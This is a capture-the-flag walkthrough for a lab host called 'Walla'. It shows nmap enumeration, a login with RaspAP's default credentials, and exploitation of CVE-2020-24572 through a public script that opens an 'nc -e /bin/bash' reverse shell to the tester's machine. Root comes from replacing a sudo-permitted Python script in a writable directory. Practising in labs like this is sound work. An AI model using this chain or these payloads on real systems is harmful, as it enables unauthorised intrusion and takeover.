##### Tags: `RaspAP`  `parent directory`  `python script`  `sudo-l`  

# 🐧Walla🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.146.97 

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
23/tcp    open  telnet     Linux telnetd
25/tcp    open  smtp       Postfix smtpd
53/tcp    open  tcpwrapped
422/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
8091/tcp  open  http       lighttpd 1.4.53
42042/tcp open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
Service Info: Host:  walla; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
we always start with the web server  
port 8091 required password to login and we found is using RaspAP
```console
$ curl -i http://192.168.146.97:8091  
HTTP/1.1 401 Unauthorized
Set-Cookie: PHPSESSID=0vr9q16kpolevlod78lt2d7ama; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
WWW-Authenticate: Basic realm="RaspAP"
Content-type: text/html; charset=UTF-8
Content-Length: 15
Date: Fri, 06 Mar 2026 11:15:50 GMT
Server: lighttpd/1.4.53

Not authorized
```
use default credential admin secret logged in  
found its running RaspAP v2.5  
found the version is CVE-2020-24572
```console
https://github.com/gerbsec/CVE-2020-24572-POC
```
```console
$ python3 exploit.py 192.168.146.97 8091 192.168.45.154 8091 secret 1      

[!] Using Reverse Shell: nc -e /bin/bash 192.168.45.154 8091
[!] Sending activation request - Make sure your listener is running . . .
[>>>] Press ENTER to continue . . .

[!] You should have a shell :)



$ penelope -p 8091                                             
[+] Listening for reverse shells on 0.0.0.0:8091 →  127.0.0.1 • 10.0.2.15 • 192.168.45.154
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from walla 192.168.146.97 Linux-x86_64 👤 www-data(33) • Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3
[+] Interacting with session [1] • Shell Type PTY • Menu key F12 ⇐
[+] Logging to /home/ming/.penelope/sessions/walla~192.168.146.97-Linux-x86_64/2026_03_06-22_20_39-537.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@walla:/var/www/html/includes$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Privilege Escalation
run sudo -l found we can run root with using python with the wifi_reset.py
```console
www-data@walla:/var/www/html/includes$ sudo -l
Matching Defaults entries for www-data on walla:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on walla:
    (ALL) NOPASSWD: /sbin/ifup
    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
    (ALL) NOPASSWD: /bin/systemctl start hostapd.service
    (ALL) NOPASSWD: /bin/systemctl stop hostapd.service
    (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service
```
the wifi_reset.py file is own by root
```console
www-data@walla:/tmp$ ls -la /home/walter/wifi_reset.py
-rw-r--r-- 1 root root 251 Sep 17  2020 /home/walter/wifi_reset.py
```
however we own the parent directory  
```console
www-data@walla:/home$ ls -la
drwxr-xr-x  2 www-data www-data 4096 Mar  6 06:56 walter
```
means we can delete the file and create another one with our payload
```console
www-data@walla:/home/walter$ rm wifi_reset.py
rm: remove write-protected regular file 'wifi_reset.py'? yes
```
```console
www-data@walla:/home/walter$ echo 'import os; os.setuid(0); os.system("/bin/sh")' > wifi_reset.py
```
run the command and we are root
```console
www-data@walla:/home/walter$ sudo /usr/bin/python /home/walter/wifi_reset.py
# id
uid=0(root) gid=0(root) groups=0(root)
```
